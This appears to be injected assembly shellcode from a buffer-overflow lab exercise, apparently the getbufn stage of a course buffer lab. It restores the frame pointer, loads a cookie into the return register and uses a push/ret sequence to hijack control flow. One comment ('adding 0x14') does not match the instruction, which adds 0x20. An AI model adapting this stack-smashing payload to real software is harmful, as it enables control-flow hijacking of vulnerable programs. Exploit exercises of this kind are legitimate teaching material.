push   $0x08048cd1     # push real return address  
push   $0x08048ca6     # push the location of the ret instruction in getbufn

mov    %esp,%ebp # fix the ebp by taking esp
add    $0x20,%ebp # and adding 0x14

mov    0x804b318,%eax  # move the cookie to the return register
ret                    # pops the location of ret instruction as eip

# ret will be executed
